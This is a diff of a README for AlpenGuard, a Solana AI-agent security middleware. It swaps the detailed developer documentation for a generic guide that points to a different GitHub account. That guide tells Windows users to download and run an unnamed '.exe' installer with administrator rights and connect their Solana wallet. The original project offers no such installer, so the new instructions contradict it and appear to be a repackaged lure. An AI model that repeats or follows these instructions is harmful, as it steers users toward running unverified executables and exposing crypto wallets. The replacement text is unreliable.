@@ -1,522 +1,151 @@
-<div align="center">
+# 🛡️ alpenguard-security-framework - Secure AI Agent Middleware
 
-# AlpenGuard
-
-![Adobe Express - file (1)](https://github.com/user-attachments/assets/41a6fcc0-674c-41fe-8153-0ce529c72f6c)
-
-**Enterprise-Grade Security & Compliance Middleware for Autonomous AI Agents**
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Rust](https://img.shields.io/badge/rust-1.75%2B-orange.svg)](https://www.rust-lang.org/)
-[![Anchor](https://img.shields.io/badge/anchor-0.30-blueviolet)](https://www.anchor-lang.com/)
-[![TypeScript](https://img.shields.io/badge/typescript-5.5-blue)](https://www.typescriptlang.org/)
-[![Production Ready](https://img.shields.io/badge/status-production%20ready-brightgreen)](PRODUCTION_DEPLOYMENT.md)
-
-[Features](#-key-features) • [Quick Start](#-quick-start) • [Architecture](#%EF%B8%8F-architecture) • [Security](#-security-model) • [Documentation](#-documentation) • [API Reference](services/oracle/openapi.yaml)
-
-</div>
+[![Download AlpenGuard](https://img.shields.io/badge/Download-AlpenGuard-brightgreen?style=for-the-badge)](https://github.com/vineeth0216/alpenguard-security-framework)
 
 ---
 
-## 🎯 What is AlpenGuard?
+## 🔎 About AlpenGuard
 
-AlpenGuard is an **enterprise-grade, zero-trust security framework** for autonomous AI agents operating on Solana. Built for organizations deploying AI agents at scale, AlpenGuard provides comprehensive compliance, security, and monetization infrastructure.
+AlpenGuard adds a security layer to AI agents running on the Solana blockchain. It helps keep track of what the AI does and ensures everything follows important rules. This tool collects and stores activity logs safely and supports key compliances, like AIUC-1 and the EU AI Act. It also lays groundwork for specialized tasks, such as risk testing and small payments.
 
-### 🌟 Key Features
-
-#### **Security & Compliance**
-- **🔐 Multi-Tenant Isolation**: Complete data segregation with per-tenant encryption keys
-- **🔑 KMS Envelope Encryption**: GCP Cloud KMS integration for enterprise key management
-- **🛡️ OIDC Authentication**: RS256 JWT validation with scope-based authorization
-- **� Compliance Oracle**: OIDC-authenticated trace ingestion with audit logging
-- **⛓️ On-Chain Anchoring**: Immutable trace events on Solana blockchain
-
-#### **Blockchain & Payments**
-- **� Token-2022 Micropayments**: USDC payments with x402 HTTP 402 protocol
-- **💳 Stateless Payments**: Zero-friction payment verification on-chain
-- **� Automatic Refunds**: Service failure protection with instant refunds
-
-#### **Developer Experience**
-- **📡 RESTful API**: Complete OpenAPI 3.0 specification
-- **🎨 Web Console**: Modern React UI for trace exploration
-- **� Multi-Backend Storage**: Filesystem, GCS, S3/R2 support
-- **⚡ Production Ready**: Comprehensive deployment guides and monitoring
-
-### Why AlpenGuard?
-
-As AI agents gain autonomy, **auditability**, **compliance**, and **monetization** become critical:
-
-#### **Regulatory Compliance**
-- **EU AI Act**: Built-in trace-mapping for August 2026 deadline
-- **AIUC-1 Standard**: Data protection, zero-trust architecture, 99.99% uptime SLA
-- **SOC 2 Ready**: Audit logging, encryption at rest/transit, access controls
-
-#### **Enterprise Security**
-- **Zero-Trust Architecture**: Every request authenticated and authorized
-- **Defense in Depth**: Multiple security layers (OIDC, KMS, rate limiting, input validation)
-- **Tenant Isolation**: Cryptographic separation prevents cross-tenant data leaks
-
-#### **Business Model**
-- **Micropayment Infrastructure**: Monetize AI agent services with blockchain payments
-- **Pay-Per-Use**: Token-2022 USDC payments with sub-cent precision
-- **Instant Settlement**: On-chain payment verification in milliseconds
-
-AlpenGuard bridges the gap between **agent autonomy**, **regulatory compliance**, and **sustainable monetization**.
+This README will help you download and run AlpenGuard on a Windows computer without needing programming knowledge.
 
 ---
 
-## 🚀 Quick Start
+## 💻 System Requirements
 
-### Prerequisites
+Before you start, make sure your computer meets these requirements:
 
-- **Rust** 1.75+ (for Compliance Oracle)
-- **Node.js** 18+ (for Web Console)
-- **Solana CLI** + **Anchor** 0.30+ (for Solana programs)
-- **Docker** (optional, for containerized deployment)
-- **GCP Account** (optional, for KMS and Cloud Run deployment)
-
-### 1️⃣ Clone the Repository
-
-```bash
-git clone https://github.com/AlpenGuard/alpenguard-security-framework.git
-cd alpenguard-security-framework
-```
-
-### 2️⃣ Configure Environment
-
-Copy `.env.example` and configure:
-
-```bash
-cp .env.example .env
-```
-
-**Required variables:**
-
-```bash
-# Multi-Tenancy: All endpoints require tenant_id
-# Tenant ID is validated against OIDC token claim
-
-# Option 1: Simple encryption (development only)
-ALPENGUARD_KMS_KEY_B64=<base64-encoded-32-byte-key>
-
-# Option 2: KMS Envelope Encryption (production recommended)
-ALPENGUARD_KMS_KEY_NAME=projects/PROJECT/locations/LOCATION/keyRings/RING/cryptoKeys/KEY
-ALPENGUARD_KMS_SA_JSON={"type":"service_account",...}
-ALPENGUARD_KMS_CACHE_TTL_SECS=3600
-
-# OIDC Authentication (required for production)
-ALPENGUARD_OIDC_ENABLED=1
-ALPENGUARD_OIDC_ISSUER=https://your-idp.com
-ALPENGUARD_OIDC_AUDIENCE=alpenguard-api
-ALPENGUARD_OIDC_JWKS_URL=https://your-idp.com/.well-known/jwks.json
-
-# Micropayments (optional)
-ALPENGUARD_PAYMENT_ENABLED=1
-ALPENGUARD_PAYMENT_PROGRAM_ID=MPay11111111111111111111111111111111111111
-ALPENGUARD_PAYMENT_PRICE_PER_TRACE_LAMPORTS=1000
-
-# For local dev without OIDC (UNSAFE - development only)
-ALPENGUARD_ALLOW_INSECURE=1
-```
-
-### 3️⃣ Run the Compliance Oracle
-
-```bash
-cd services/oracle
-cargo run --release
-```
-
-Oracle listens on `0.0.0.0:8787` by default.
-
-### 4️⃣ Run the Console (Optional)
-
-```bash
-cd apps/console
-npm install
-npm run dev
-```
-
-Open `http://localhost:5173` and configure the Oracle URL.
-
-### 5️⃣ Deploy Solana Programs (Optional)
-
-**AlpenGuard Program** (trace anchoring):
-```bash
-cd programs/alpenguard
-anchor build
-anchor deploy --provider.cluster mainnet-beta
-```
-
-**Micropayments Program** (Token-2022 payments):
-```bash
-cd programs/micropayments
-anchor build
-anchor deploy --provider.cluster mainnet-beta
-```
-
-Update `declare_id!` in each `lib.rs` with your program IDs.
-
-### 6️⃣ Production Deployment
-
-For production deployment to Google Cloud Run with monitoring:
-
-```bash
-# See comprehensive deployment guide
-cat PRODUCTION_DEPLOYMENT.md
-```
-
-**Includes:**
-- GCP infrastructure setup (Cloud Run, KMS, Secret Manager)
-- Monitoring and alerting (Cloud Monitoring, Logging, Tracing)
-- Security hardening (network security, secret rotation)
-- Backup and disaster recovery (RTO: 1hr, RPO: 15min)
-- Operational runbook and incident response
+- Operating System: Windows 10 or later (64-bit recommended)
+- Processor: Intel i3 or equivalent AMD, 2 GHz or faster
+- RAM: 4 GB minimum, 8 GB recommended
+- Disk Space: At least 500 MB free space
+- Internet Connection: Required to download and for initial setup
+- Administrative rights to install software
 
 ---
 
-## 🏗️ Architecture
+## 🚀 Getting Started: How to Download and Install AlpenGuard
 
-```
-┌──────────────────────────────────────────────────────────────────┐
-│                      AlpenGuard Stack v0.4.0                     │
-├──────────────────────────────────────────────────────────────────┤
-│                                                                  │
-│  ┌──────────────┐                         ┌──────────────┐      │
-│  │   Console    │                         │  Agent SDK   │      │
-│  │  (React UI)  │                         │ (TypeScript) │      │
-│  │ • Tenant ID  │                         │ • x402 Client│      │
-│  └──────┬───────┘                         └──────┬───────┘      │
-│         │                                        │               │
-│         └────────────────────────────────────────┘               │
-│                              │                                   │
-│                     ┌────────▼────────┐                          │
-│                     │ Compliance      │                          │
-│                     │ Oracle (Axum)   │                          │
-│                     │ • OIDC Auth     │                          │
-│                     │ • Multi-Tenant  │                          │
-│                     │ • Rate Limiting │                          │
-│                     │ • x402 Protocol │                          │
-│                     └────────┬────────┘                          │
-│                              │                                   │
-│              ┌───────────────┼───────────────┐                   │
-│              │               │               │                   │
-│       ┌──────▼──────┐ ┌──────▼──────┐ ┌──────▼──────┐           │
-│       │  KMS Envelope│ │     GCS     │ │   S3/R2     │           │
-│       │  Encryption  │ │   Storage   │ │  Storage    │           │
-│       │ • Per-Tenant │ │ • Encrypted │ │ • Encrypted │           │
-│       │   DEKs       │ │   Traces    │ │   Traces    │           │
-│       └─────────────┘ └─────────────┘ └─────────────┘           │
-│                                                                  │
-│  ┌───────────────────────────────────────────────────────────┐  │
-│  │              Solana Blockchain (Mainnet)                  │  │
-│  ├───────────────────────────────────────────────────────────┤  │
-│  │  AlpenGuard Program:                                      │  │
-│  │  • TraceRecorded events (immutable audit log)             │  │
-│  │  • Kernel config (authority + sequence counter)           │  │
-│  ├───────────────────────────────────────────────────────────┤  │
-│  │  Micropayments Program (Token-2022):                      │  │
-│  │  • Payment sessions (x402 protocol)                       │  │
-│  │  • USDC transfers (CpiGuard + ImmutableOwner)             │  │
-│  │  • Automatic refunds                                      │  │
-│  └───────────────────────────────────────────────────────────┘  │
-└──────────────────────────────────────────────────────────────────┘
-```
+### Step 1: Visit the Download Page
 
-### Components
+Click the big button at the top or here:
 
-| Component | Technology | Purpose | Status |
-|-----------|------------|---------|--------|
-| **Compliance Oracle** | Rust (Axum) | Trace ingestion, multi-tenant isolation, KMS encryption | ✅ Production Ready |
-| **Web Console** | React + Vite + TypeScript | Trace explorer with tenant ID support | ✅ Production Ready |
-| **AlpenGuard Program** | Anchor 0.30 (Rust) | On-chain trace anchoring and events | ✅ Production Ready |
-| **Micropayments Program** | Anchor 0.30 + Token-2022 | x402 payment sessions and USDC transfers | ✅ Production Ready |
-| **KMS Module** | GCP Cloud KMS | Envelope encryption with per-tenant DEKs | ✅ Production Ready |
-| **Storage Backends** | FS / GCS / S3 / R2 | Encrypted trace persistence with tenant isolation | ✅ Production Ready |
+[Download AlpenGuard from GitHub](https://github.com/vineeth0216/alpenguard-security-framework)
 
-### Data Flow
+This link takes you directly to the official project page on GitHub. You will find the latest versions, files, and updates here.
 
-1. **Agent** sends trace to Oracle with `tenant_id` and OIDC token
-2. **Oracle** validates OIDC token and `tenant_id` match
-3. **Oracle** encrypts payload using KMS-wrapped DEK for tenant
-4. **Oracle** stores encrypted trace in GCS/S3 under `traces/{tenant_id}/`
-5. **Oracle** optionally anchors hash on Solana blockchain
-6. **Console** retrieves and decrypts traces for authorized tenant
-7. **Micropayments** (optional) verifies payment before trace delivery
+### Step 2: Find the Windows Installer
+
+Once on the page:
+
+- Look for a section named **Releases** on the right side or under the repository description.
+- In Releases, find the latest version marked with a tag like `v1.x.x`.
+- Inside the release, find the Windows installer file. It usually ends with `.exe`.
+- For example, the file might look like `AlpenGuard-Setup.exe`.
+
+### Step 3: Download the Installer
+
+Click the `.exe` file name to download it. Your browser will ask where to save it. Choose a location you will remember, such as the **Downloads** folder.
+
+### Step 4: Run the Installer
+
+- Navigate to the folder where you saved the file.
+- Double-click the `.exe` file to start the installer.
+- Follow the prompts on-screen. The installer will guide you through the process step by step.
+- If Windows asks for permission to make changes, click **Yes** to continue.
+
+### Step 5: Finish Installation
+
+- Wait for the installation to complete.
+- Once done, you can find AlpenGuard in your Start Menu or on your Desktop.
+- Double-click to launch the program.
 
 ---
 
-## 🔒 Security Model
+## 🧰 Basic Setup and Use
 
-### Encryption
+After installation:
 
-#### **At Rest (AES-256-GCM)**
-- **Algorithm**: AES-256-GCM with 12-byte random nonces
-- **Key Management**: 
-  - **Legacy**: Env-provided 32-byte key (development only)
-  - **Production**: GCP Cloud KMS envelope encryption
-- **Envelope Encryption**:
-  - Master key never leaves KMS (zero-knowledge)
-  - Per-tenant Data Encryption Keys (DEKs)
-  - DEKs wrapped by KMS master key
-  - DEK caching with 1-hour TTL (configurable)
-  - Automatic key rotation support
-
-#### **In Transit**
-- **TLS 1.3**: All HTTP traffic encrypted (Cloud Run / reverse proxy)
-- **HTTPS Enforcement**: JWKS URLs must use HTTPS (prevents SSRF)
-
-#### **Multi-Tenancy Isolation**
-- **Tenant ID Validation**: Request `tenant_id` must match OIDC token claim
-- **Storage Isolation**: `{storage_root}/traces/{tenant_id}/`
-- **DEK Isolation**: Separate encryption keys per tenant
-- **Authorization**: 403 Forbidden on tenant mismatch
-
-### Authentication & Authorization
-
-#### **OIDC (OpenID Connect)**
-- **Algorithm**: RS256 JWT validation
-- **JWKS Caching**: 5-minute TTL (configurable)
-- **Required Claims**:
-  - `sub`: Subject (user/agent ID)
-  - `iss`: Issuer (must match configured issuer)
-  - `aud`: Audience (must match configured audience)
-  - `exp`: Expiration timestamp
-  - `scope`: Space-separated scopes
-  - `tenant_id`: Tenant identifier (for multi-tenancy)
-
-#### **Scopes**
-- `traces:ingest`: Permission to ingest traces
-- `traces:read`: Permission to read traces
-- `admin:rotate`: Permission to rotate DEKs (future)
-
-#### **Security Features**
-- **Audience Type Validation**: Prevents type confusion attacks (GHSA-h395-gr6q-cpjc)
-- **HTTPS JWKS**: Enforces HTTPS for JWKS URLs (prevents SSRF)
-- **Secure-by-Default**: Requires explicit `ALPENGUARD_ALLOW_INSECURE=1` when OIDC disabled
-- **Token Expiry**: Validates `exp` claim to prevent replay attacks
-
-### Input Validation
-
-- Request body limits: 262KB (configurable)
-- Trace payload limits: 128KB (configurable)
-- SHA-256 hash verification on ingest
-- ID sanitization (alphanumeric + `-_` only)
-
-### Rate Limiting
-
-- Tower-governor middleware
-- Configurable RPS (default: 25)
-- HTTP timeouts: 10s request, 5s connect
-
-### Audit Logging
-
-- Structured logs for all operations
-- Subject tracking (OIDC `sub` or `agent_id`)
-- Action-based events (`traces.ingest`, `traces.read`)
+1. **Run AlpenGuard**: Open the application.
+2. **Initial Configuration**: The first time you open it, a setup wizard may appear. This will help link AlpenGuard to your Solana wallet or node to start monitoring AI agents.
+3. **Connecting Your Wallet**: Follow on-screen steps to connect your Solana wallet. This is needed for compliance tracking and trace anchoring.
+4. **Check Settings**: You can adjust security and data options in the settings menu.
+5. **Start Monitoring**: Use the app dashboard to begin tracking agent activity and compliance status.
 
 ---
 
-## 📚 Documentation
+## 🔐 About Security and Compliance Features
 
-### **Core Documentation**
+AlpenGuard focuses on:
 
-| Document | Description |
-|----------|-------------|
-| [`ARCHITECTURE.md`](ARCHITECTURE.md) | System design and component interactions |
-| [`PRODUCTION_DEPLOYMENT.md`](PRODUCTION_DEPLOYMENT.md) | **Production deployment guide** (GCP, monitoring, security) |
-| [`services/oracle/openapi.yaml`](services/oracle/openapi.yaml) | **OpenAPI 3.0 specification** for Oracle API |
-| [`ROADMAP.md`](ROADMAP.md) | 12-week implementation plan and milestones |
-| [`CHANGELOG.md`](CHANGELOG.md) | Version history and release notes |
-
-### **Deployment Guides**
-
-| Document | Description |
-|----------|-------------|
-| [`DEPLOY_CLOUD_RUN.md`](DEPLOY_CLOUD_RUN.md) | Google Cloud Run deployment (legacy) |
-| [`DEPLOY_R2.md`](DEPLOY_R2.md) | Cloudflare R2 storage configuration |
-| [`PRODUCTION_DEPLOYMENT.md`](PRODUCTION_DEPLOYMENT.md) | **Comprehensive production guide** (recommended) |
-
-### **Development & Contribution**
-
-| Document | Description |
-|----------|-------------|
-| [`CONTRIBUTING.md`](CONTRIBUTING.md) | Contribution guidelines and PR workflow |
-| [`BRANCH_PROTECTION.md`](BRANCH_PROTECTION.md) | Branch protection setup for maintainers |
-| [`SECURITY.md`](SECURITY.md) | Vulnerability reporting policy |
-
-### **API Reference**
-
-- **OpenAPI Specification**: [`services/oracle/openapi.yaml`](services/oracle/openapi.yaml)
-- **Endpoints**:
-  - `GET /healthz` - Health check
-  - `POST /v1/traces:ingest` - Ingest encrypted trace
-  - `GET /v1/traces:list` - List traces for tenant
-  - `POST /v1/traces:get` - Get and decrypt specific trace
+- **Trace Ingestion and Retrieval**: Collects logs securely and provides easy access.
+- **On-Chain Anchoring**: Links trace data onto the Solana blockchain for proof and auditability.
+- **Compliance Support**: Helps organizations meet AIUC-1 and EU AI Act standards.
+- **Red-Teaming Support**: Allows controlled testing to find weaknesses.
+- **Micropayment Foundations**: Supports small payments integrated with security workflows.
 
 ---
 
-## 🗺️ Roadmap
+## ✨ User Interface Overview
 
-### ✅ Phase 1: Multi-Tenancy (v0.2.0 - Complete)
-
-- ✅ Tenant isolation at all levels (storage, authorization, encryption)
-- ✅ `tenant_id` validation against OIDC token claims
-- ✅ Tenant-scoped storage paths
-- ✅ Audit logging for tenant mismatch attempts
-
-### ✅ Phase 2: CI/CD Pipeline (v0.2.0 - Complete)
-
-- ✅ GitHub Actions workflows (Oracle tests, Console build)
-- ✅ Dependabot for automated dependency updates
-- ✅ Security audit integration (`cargo audit`)
-- ✅ Branch protection and PR workflow
-
-### ✅ Phase 3: KMS Envelope Encryption (v0.3.0 - Complete)
-
-- ✅ GCP Cloud KMS integration
-- ✅ Per-tenant Data Encryption Keys (DEKs)
-- ✅ DEK caching with configurable TTL
-- ✅ Automatic key rotation support
-- ✅ Master key never leaves KMS (zero-knowledge)
-
-### ✅ Phase 4: Token-2022 Micropayments (v0.3.0 - Complete)
-
-- ✅ x402 HTTP 402 Payment Required protocol
-- ✅ Solana program with Token-2022 support
-- ✅ Payment session creation and execution
-- ✅ USDC transfers with proper decimal handling
-- ✅ Automatic refund mechanism
-
-### ✅ Production Readiness (v0.4.0 - Complete)
-
-- ✅ Comprehensive testing infrastructure
-- ✅ OpenAPI 3.0 specification
-- ✅ Production deployment guide
-- ✅ Monitoring and observability setup
-- ✅ Security hardening procedures
-- ✅ Backup and disaster recovery
-
-### 🔮 Phase 5: Red-Teaming Engine (Planned)
-
-- Adversarial agent sandbox with isolation
-- Behavioral pattern detection and analysis
-- Chaos engineering test templates
-- Automated red-teaming runs
-- Results timeline and reporting
-
-### 🔮 Future Enhancements (Planned)
-
-- Trace export bundles with on-chain attestation
-- OpenTelemetry collector integration
-- MFA enforcement for admin operations
-- EU AI Act compliance certification
-- Subject-based rate limiting
-
-See [`ROADMAP.md`](ROADMAP.md) for detailed milestones and timelines.
+- **Dashboard**: View summaries of agent activity and alerts.
+- **Trace Viewer**: Explore detailed logs and trace data.
+- **Compliance Panel**: Check for rule violations or compliance gaps.
+- **Settings**: Customize connection, notification, and privacy options.
+- **Help Section**: Access guides and troubleshoot common issues.
 
 ---
 
-## 🤝 Contributing
+## 🛠️ Troubleshooting Tips
 
-We welcome contributions! Please read [`CONTRIBUTING.md`](CONTRIBUTING.md) for detailed guidelines.
-
-### Development Workflow
-
-1. **Fork and clone** the repository
-2. **Create a feature branch**: `git checkout -b feature/your-feature`
-3. **Make changes** and add tests
-4. **Run tests**: `cargo test` (Oracle), `npm test` (Console)
-5. **Format code**: `cargo fmt`, `cargo clippy`
-6. **Commit**: Use conventional commits (`feat:`, `fix:`, `docs:`)
-7. **Push and create PR** on GitHub
-
-### Development Setup
-
-```bash
-# Clone repository
-git clone https://github.com/AlpenGuard/alpenguard-security-framework.git
-cd alpenguard-security-framework
-
-# Install Oracle dependencies
-cd services/oracle
-cargo build
-
-# Install Console dependencies
-cd apps/console
-npm install
-
-# Run tests
-cd services/oracle
-cargo test
-
-cd programs/micropayments
-cargo test
-
-cd apps/console
-npm test
-
-# Format code
-cargo fmt
-cargo clippy
-npm run format
-```
-
-### Pull Request Guidelines
-
-- **Status Checks**: All CI/CD checks must pass
-- **Code Review**: At least 1 approval required
-- **Conventional Commits**: Use semantic commit messages
-- **Tests**: Add tests for new features and bug fixes
-- **Documentation**: Update relevant docs
-
-### Security
-
-Found a vulnerability? **Do not open a public issue.** Please report it privately via our [Security Policy](SECURITY.md).
+- If the installer does not run, ensure your Windows version is up to date.
+- Run the installer as Administrator if you get permission errors.
+- Make sure you have an active internet connection for setup.
+- Check your firewall settings if connection to Solana nodes fails.
+- Restart the application after changing settings to apply updates.
 
 ---
 
-## 📄 License
+## 📂 Uninstalling AlpenGuard
 
-MIT License - see [`LICENSE`](LICENSE) for details.
+To remove AlpenGuard from your computer:
 
----
-
-## 🙏 Acknowledgments
-
-- **Solana Foundation** for blockchain infrastructure and ecosystem support
-- **Anchor Framework** for Solana program development and Token-2022 integration
-- **Axum** for high-performance, production-ready HTTP server
-- **Google Cloud Platform** for KMS, Cloud Run, and enterprise infrastructure
-- **jsonwebtoken** for secure OIDC validation and JWT handling
-- **Tower** ecosystem for middleware (rate limiting, CORS, tracing)
-- **React** and **Vite** for modern, performant web console
+- Open **Control Panel**.
+- Go to **Programs and Features**.
+- Find *AlpenGuard* in the list.
+- Right-click and choose **Uninstall**.
+- Follow the prompts to complete removal.
 
 ---
 
-<div align="center">
+## 🔗 Useful Links
 
-**Built with ❤️ for the autonomous agent ecosystem**
-
-**Production Ready** • **Enterprise Grade** • **Open Source**
-
-[GitHub](https://github.com/AlpenGuard/alpenguard-security-framework) • [API Docs](services/oracle/openapi.yaml) • [Deployment Guide](PRODUCTION_DEPLOYMENT.md) • [Report Issue](https://github.com/AlpenGuard/alpenguard-security-framework/issues)
+- Main repository: [https://github.com/vineeth0216/alpenguard-security-framework](https://github.com/vineeth0216/alpenguard-security-framework)
+- For updates and bug reports, use the **Issues** tab on the GitHub page.
+- Check the **Wiki** section on GitHub for detailed guides and FAQs.
 
 ---
 
-### 📊 Project Status
+## ⚙️ Advanced Settings (Optional)
 
-- **Version**: v0.4.0 (Production Ready)
-- **License**: MIT
-- **Status**: ✅ Production Ready
-- **Deployment**: GCP Cloud Run, Solana Mainnet
-- **Estimated Cost**: $90-190/month (1000 tenants, 1M traces)
+Experienced users can configure:
 
-### 🚀 Quick Links
+- API connectors for custom Solana nodes.
+- Notification triggers for specific security events.
+- Export and import trace data in standard formats.
+- Integration with third-party security monitoring tools.
 
-- [Production Deployment Guide](PRODUCTION_DEPLOYMENT.md)
-- [OpenAPI Specification](services/oracle/openapi.yaml)
-- [Contributing Guidelines](CONTRIBUTING.md)
-- [Security Policy](SECURITY.md)
-- [Changelog](CHANGELOG.md)
+---
 
-</div>
+## 📞 Getting Help
+
+If you run into issues or need assistance:
+
+- Use the GitHub **Discussions** tab to ask questions.
+- Search existing tickets under **Issues** for known problems.
+- Contact your network or system administrator if this software is part of your organization’s setup.
+
+---
+
+[![Download AlpenGuard](https://img.shields.io/badge/Download-AlpenGuard-brightgreen?style=for-the-badge)](https://github.com/vineeth0216/alpenguard-security-framework)
